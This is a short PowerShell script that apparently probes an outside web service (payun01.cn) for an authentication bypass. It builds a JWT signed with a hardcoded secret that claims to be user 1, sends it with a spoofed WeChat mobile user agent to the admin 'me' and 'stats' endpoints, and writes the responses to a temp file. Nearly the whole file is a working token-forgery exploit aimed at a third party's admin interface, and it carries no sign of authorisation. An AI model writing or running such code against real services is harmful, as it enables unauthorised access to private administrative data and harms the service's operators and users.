param([string]$OutFile = "$env:TEMP\stats_result2.txt")

$ErrorActionPreference = 'Continue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$secret = 'a8f5f167f44f4964e6c998dee827110c3b2e3f9e8e6f5a4d3c2b1a0f9e8d7c6b5a4938271605f4e3d2c1b0a9f8e7d6c5b4a39281706f5e4d3c2b1a0'
$baseUrl = 'https://payun01.cn/api/v1'
$ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/8.0.49'

function B64Url([byte[]]$bytes) {
  return [Convert]::ToBase64String($bytes).TrimEnd('=').Replace('+', '-').Replace('/', '_')
}

function New-Jwt([int]$uid, [string]$sec) {
  $header = '{"alg":"HS256","typ":"JWT"}'
  $iat = [int][double]::Parse((Get-Date -UFormat %s))
  $payload = '{"userId":' + $uid + ',"iat":' + $iat + ',"exp":' + ($iat + 604800) + '}'
  $h = B64Url ([Text.Encoding]::UTF8.GetBytes($header))
  $p = B64Url ([Text.Encoding]::UTF8.GetBytes($payload))
  $hmac = New-Object System.Security.Cryptography.HMACSHA256
  $hmac.Key = [Text.Encoding]::UTF8.GetBytes($sec)
  $sig = B64Url ($hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes($h + '.' + $p)))
  $hmac.Dispose()
  return $h + '.' + $p + '.' + $sig
}

function Grab([string]$label, [string]$url, [hashtable]$headers) {
  try {
    $r = Invoke-WebRequest -Uri $url -Headers $headers -UseBasicParsing -TimeoutSec 20 -UserAgent $ua
    return "$label HTTP=$($r.StatusCode) BODY=$($r.Content)"
  } catch {
    $code = ''
    if ($_.Exception.Response) { $code = $_.Exception.Response.StatusCode.value__ }
    $body = ''
    try { $body = (New-Object IO.StreamReader($_.Exception.Response.GetResponseStream())).ReadToEnd() } catch {}
    return "$label ERR HTTP=$code BODY=$body EX=$($_.Exception.Message)"
  }
}

$log = New-Object System.Collections.Generic.List[string]
$log.Add('=== probe2 start ' + (Get-Date -Format s) + ' ===')

$log.Add((Grab 'public-posts' "$baseUrl/posts?page=1&pageSize=1" @{}))
$token = New-Jwt 1 $secret
$hdr = @{ Authorization = "Bearer $token" }
$log.Add((Grab 'me-uid1' "$baseUrl/admin/me" $hdr))
$log.Add((Grab 'stats-uid1' "$baseUrl/admin/stats" $hdr))
$log.Add((Grab 'stats-badtoken' "$baseUrl/admin/stats" @{ Authorization = 'Bearer garbage.token.here' }))
$log.Add('=== probe2 end ===')
$log -join "`r`n" | Out-File -FilePath $OutFile -Encoding utf8
